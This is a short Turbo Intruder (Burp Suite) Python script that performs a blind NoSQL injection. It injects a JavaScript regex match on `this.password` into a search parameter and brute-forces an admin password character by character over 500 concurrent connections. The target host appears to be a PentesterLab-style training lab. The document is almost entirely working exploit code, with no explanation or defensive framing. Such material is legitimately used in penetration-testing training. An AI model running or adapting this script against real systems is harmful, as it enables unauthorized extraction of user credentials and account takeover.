# Blind exfiltration - %s is the exfil point
#http://ptl-3d7c610b-0a687d7e.libcurl.so/?search=admin'%26%26%20this.password.match(/^5b317d17-3e%s.*$/)%26%26%20'1'=='1

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=500,
                           requestsPerConnection=1,
                           pipeline=True
                           )

    #Initial bruteforce of characters
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-"    
    for letter in charset:
        engine.queue(target.req, letter) 
     

def handleResponse(req, interesting):
    if '>admin<' in req.response:
        table.add(req)
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-"    
        for letter in charset:
            req.engine.queue(req.template, req.words[0]+letter)
    
